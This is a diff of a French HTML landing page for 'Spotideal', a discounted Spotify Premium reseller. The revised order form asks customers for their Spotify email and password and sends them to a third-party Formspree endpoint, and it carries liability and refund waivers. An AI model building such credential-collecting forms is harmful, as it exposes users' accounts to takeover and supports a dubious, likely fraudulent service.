@@ -4,50 +4,80 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Spotideal - Abonnement Spotify à moindre coût</title>
-    <link rel="stylesheet" href="styles.css">
-    <script src="script.js" defer></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="src/css/design-system.css">
+    <link rel="stylesheet" href="src/css/style.css">
+    <script src="src/js/script.js" defer></script>
 </head>
 <body>
     <header>
-        <h1>Spotideal</h1>
-        <p>Abonnement Spotify à moindre coût</p>
+        <div class="logo">
+            <img src="src/images/logo.webp" alt="Spotideal Logo">
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#features">Fonctionnalités</a></li>
+                <li><a href="#offer">Offre</a></li>
+                <li><a href="#how-it-works">Comment ça marche</a></li>
+                <li><a href="#faq">FAQ</a></li>
+                <li><a href="#order">Commander</a></li>
+            </ul>
+        </nav>
     </header>
     <main>
-        <section id="important-message">
-            <h2>Important - Sécurité du Compte</h2>
-            <ul>
-                <li>Changez votre mot de passe Spotify avant de commencer la commande.</li>
-                <li>Utilisez un mot de passe temporaire que vous pourrez changer après l'activation.</li>
-                <li>Ne partagez jamais votre mot de passe habituel.</li>
-            </ul>
+        <section id="hero">
+            <h1>L’Expérience Premium. Le Prix en Moins.</h1>
+            <p>Profitez de Spotify Premium à un prix réduit grâce à notre service d’activation.</p>
+            <div class="cta-buttons">
+                <button onclick="scrollToSection('offer')">Découvrir l’Offre</button>
+                <button onclick="scrollToSection('how-it-works')">Comment ça marche ?</button>
+            </div>
+            <div class="testimonials">
+                <img src="src/images/avatar-1.webp" alt="Client satisfait">
+                <img src="src/images/avatar-2.webp" alt="Client satisfait">
+                <img src="src/images/avatar-3.webp" alt="Client satisfait">
+                <p>+ 500 clients satisfaits</p>
+            </div>
+            <div class="hero-image">
+                <img src="src/images/hero-phone.webp" alt="Mock-up smartphone">
+            </div>
         </section>
-        <section id="service-details">
-            <h2>Notre Service</h2>
-            <p>Nous vous connectons temporairement à votre compte pour activer un abonnement Spotify de 12 mois prépayé à moindre coût.</p>
-            <p><strong>Prix :</strong> <span style="color: #1db954;">82.62$ TOUT FRAIS INCLUS</span> (Forfait individuel 1 an)</p>
-            <p><strong>Prix normal :</strong> 175.12$</p>
-        </section>
-        <section id="order-form">
-            <h2>Passer une commande</h2>
+        <!-- ...existing sections (Offre, Comparatif des Prix, Pourquoi nous faire confiance, etc.)... -->
+        <section id="order">
+            <h2>Commander</h2>
+            <div class="important-box">
+                <h3>Important – Sécurité du Compte</h3>
+                <ul>
+                    <li>Changez votre mot de passe Spotify avant de commencer.</li>
+                    <li>Utilisez un mot de passe temporaire.</li>
+                    <li>Ne partagez jamais votre mot de passe habituel.</li>
+                </ul>
+            </div>
             <form id="orderForm" action="https://formspree.io/f/xanorewp" method="POST">
-                <label for="username">Nom d'utilisateur Spotify :</label>
-                <input type="text" id="username" name="username" required>
-                
-                <label for="password">Mot de passe temporaire :</label>
-                <input type="password" id="password" name="password" required>
-                
-                <label for="email">Adresse e-mail :</label>
+                <label for="email">E-mail Spotify :</label>
                 <input type="email" id="email" name="email" required>
-                
+                <label for="password">Mot de passe Spotify :</label>
+                <input type="password" id="password" name="password" required>
+                <div class="checkboxes">
+                    <label><input type="checkbox" required> J’ai changé mon mot de passe avant de commencer.</label>
+                    <label><input type="checkbox" required> Je comprends que vous me connecterez temporairement à mon compte.</label>
+                    <label><input type="checkbox" required> Je comprends que toutes mes informations seront supprimées après activation.</label>
+                    <label><input type="checkbox" required> Je m’engage à changer mon mot de passe après activation.</label>
+                    <label><input type="checkbox" required> Je comprends que vous n’êtes pas responsable des décisions de Spotify.</label>
+                    <label><input type="checkbox" required> Mon abonnement ne doit pas être actif au moment de l’achat.</label>
+                    <label><input type="checkbox" required> Je comprends qu’il n’y aura pas de remboursement si activation réussie.</label>
+                </div>
                 <input type="hidden" id="orderNumber" name="orderNumber">
-                
-                <button type="submit">Commander</button>
+                <button id="submitOrder" disabled>Passer au paiement</button>
             </form>
         </section>
     </main>
     <footer>
         <p>Contactez-nous : <a href="mailto:spotideals.github.io@gmail.com">spotideals.github.io@gmail.com</a></p>
+        <ul>
+            <li><a href="#cgv">CGV</a></li>
+            <li><a href="#privacy">Confidentialité</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
     </footer>
 </body>
 </html>
